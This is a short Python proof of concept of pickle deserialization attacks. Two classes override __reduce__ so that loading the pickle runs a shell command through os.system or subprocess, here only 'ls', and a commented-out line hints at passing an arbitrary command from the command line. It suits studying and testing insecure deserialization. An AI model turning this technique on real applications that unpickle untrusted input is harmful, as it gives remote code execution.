import pickle

class Exploit(object):
    def __reduce__(self):
        # import os
        # return (os.system, (CMD_TMP.format(sys.argv[1]), ))
        import subprocess
        return (subprocess.check_output, (('ls', ), ))


class Exploit2(object):
    def __reduce__(self):
        import os
        return (os.system, ('ls', ))


print('subprocess')
p = pickle.dumps(Exploit())
print(pickle.loads(p))

print('os')
p = pickle.dumps(Exploit2())
pickle.loads(p)
